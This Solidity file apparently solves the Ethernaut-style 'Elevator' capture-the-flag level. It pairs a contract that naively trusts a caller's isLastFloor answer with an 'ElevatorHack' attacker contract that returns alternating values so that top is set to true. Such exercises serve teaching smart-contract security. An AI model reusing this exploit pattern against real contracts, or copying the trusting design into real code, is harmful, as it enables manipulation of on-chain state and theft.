// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract ElevatorHack {
    bool public amIInElevator = true;
    Elevator target;
    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external returns (bool) {
        amIInElevator = !amIInElevator;
        return amIInElevator;
    }

    function goTo(uint _floor) public {
        target.goTo(_floor);
    }
}
